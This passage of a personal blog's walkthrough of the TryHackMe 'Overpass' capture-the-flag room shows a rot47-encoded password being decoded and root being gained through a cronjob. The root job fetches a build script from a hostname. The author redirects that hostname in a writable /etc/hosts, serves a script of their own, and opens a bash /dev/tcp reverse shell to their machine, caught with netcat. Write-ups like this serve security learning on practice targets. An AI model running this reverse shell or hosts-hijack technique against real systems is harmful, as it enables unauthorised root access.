<p>Important things are being talked about here. James keeps a password around here, but he said he used his own password manager.
There was something he wanted to talk to Pardox about. He also says how the build script works automatically in the system.</p>

<p>I examined the files again using <strong><code class="language-plaintext highlighter-rouge">ls -la</code></strong> and there is another file called .overpass, and when I looked inside, I found something like this.</p>

<p><img src="/assets/img/tryhackme/overpass/pass.png" alt="aboutus"></p>

<p>This must be the password that James mentioned in todo.txt, but we don’t know how he encrypted it. But he told us they did it using their own password manager. So why don’t we go back to the website and examine the source code of the overpass?
What I noticed when I reviewed the code is this.</p>

<p><img src="/assets/img/tryhackme/overpass/source.png" alt="aboutus"></p>

<p>The algorithm they use according to the code they wrote is <strong><code class="language-plaintext highlighter-rouge">rotate-47</code></strong></p>

<p><img src="/assets/img/tryhackme/overpass/rot.png" alt="aboutus"></p>

<p>And here we found a password but I didn’t understand where to put it.</p>

<p>But if we need to go back to todo.txt, James was talking about the continuous and automatic loading of the application there, why don’t we look at the cronjob.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cat /etc/crontab
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/overpass/cron.png" alt="aboutus"></p>

<p>And here we get important information. As we can see, the root user automatically runs the file <code class="language-plaintext highlighter-rouge">overpass.thm/downloads/src/buildscript.sh</code> as <strong><code class="language-plaintext highlighter-rouge">cronjob</code></strong>.
In other words, a bash file is running automatically in the system, if we can change this file, we can place our own reverse shell.
I tried to open and change the file several times, but I couldn’t do anything because it exceeded my authorization limits. But there was one thing I missed, overpass.thm is a hostname and if we manage to change this hostname and enter our own machine information, I can run my own buildscript.sh file.
For this I first check the contents of  <strong><code class="language-plaintext highlighter-rouge">/etc/hosts</code></strong>.</p>

<p><img src="/assets/img/tryhackme/overpass/hosts.png" alt="aboutus"></p>

<p>Interestingly, James has the ability to modify this file.
Using my own machine ip, I change the overpass.thm line to<strong><code class="language-plaintext highlighter-rouge">"10.8.81.166 overpass.thm"</code></strong>
Then I will do the following in order on my own machine. I will create the /downloads/src/buildscript.sh file. And I will write revershell inside this file, then I will open an http.server just outside the downloads folder. At the same time, I will open a listener for nc using the same port as the port I entered in revershell. Then cronjab will connect to my machine and get the downoads/src/buildscript.sh file and then run it. The revershell inside it will also work and boom we’ll go inside.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ bash -i &gt;&amp; /dev/tcp/10.8.81.166/4444 &gt;&amp;1
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ mkdir downloads
$ cd downloads
$ mdir src
$ cd src
$ nano buildscript.sh
$ cd ../..
$ python3 -m http.server 80
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nc -nlvp 4444
</code></pre></div></div>
<p>We are inside.</p>

<p><img src="/assets/img/tryhackme/overpass/root.png" alt="aboutus"></p>

<p>And root flag .</p>

<p><img src="/assets/img/tryhackme/overpass/root_flag.png" alt="aboutus"></p>

<p>It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care.</p>

  </div>
  <div class="post__footer">
    <p class="post__date">
      <i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i>  Mar 01, 2023</p>
    <div class="post__categories">
      
      
      <p><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: <a href="/categories/#TryHackMe">TryHackMe</a></p>
            
    </div>      
    
    <div class="post__tags">
      <p class="post__tags-title">
        <span class="post__tags__title"><i class="fas fa-fw fa-tags" aria-hidden="true"></i>Tags: </span>
        <span class="post__tags-container">
          
          <span class="post__tags-item">security,</span>
          
          <span class="post__tags-item">easy,</span>
          
          <span class="post__tags-item">cron,</span>
          
          <span class="post__tags-item">owasp top 10</span>
          
        </span>
      </p>
    </div>
    
  </div>
</div>
<br>
<!-- Twitter Share Button -->
<a href="https://twitter.com/intent/tweet?text=Tryhackme%20-%20Overpass&amp;url=http://localhost:4000/tryhackme-overpass/&amp;via=Mr0Wido" target="_blank" rel="noopener noreferrer" class="share-btn tweet-btn" title="Share on Twitter">
    Tweet
</a>
  
<!-- LinkedIn Share Button -->
<a href="https://www.linkedin.com/sharing/share-offsite/?url=http://localhost:4000/tryhackme-overpass/" target="_blank" rel="noopener noreferrer" class="share-btn" title="Share on LinkedIn">
    LinkedIn
</a>
  
  

<br>


<div id="disqus_thread"></div>
<script>
    var disqus_config = function () {
    this.page.url = 'http://localhost:4000/tryhackme-overpass/';
    this.page.identifier = '/tryhackme-overpass';
    
    };

    (function() { // DON'T EDIT BELOW THIS LINE
    var d = document, s = d.createElement('script');
    s.src = 'https://mr0widos-blog.disqus.com/embed.js';
    s.setAttribute('data-timestamp', +new Date());
    (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="external nofollow noopener" target="_blank">comments powered by Disqus.</a>
</noscript>



        </main>
      </div>
    </div>




    <button onclick="topFunction()" id="myBtn" title="Go to top"><i class="fas fa-chevron-circle-up fa-2x"></i></button>
    <footer>
  <div class="footer">
    © Copyright 2024 Mr0Wido's Blog | Powered by Jekyll | <a href="/tos/">Terms of Service</a> | <a href="/disclaimer/">Disclaimer</a>
  </div>
</footer>

    <!-- script -->
    <script src="/assets/js/nav.js"></script>
    <script src="/assets/js/clip.js"></script>
    <script src="/assets/js/scroll-top.js"></script>
    <script src="/assets/js/search.js"></script>
    <script type="application/ld+json">
  {
    "@context": "https://schema.org",
    "@type": "Article",
    "headline": "Tryhackme - Overpass",
    "author": {
      "@type": "Person",
      "name": ""
    },
    "datePublished": "2023-03-01 00:00:00 +0300",
    "mainEntityOfPage": {
      "@type": "WebPage",
      "@id": "http://localhost:4000/tryhackme-overpass/"
    },
    "articleSection": "TryHackMe"
  }
</script>
  </body>
</html>
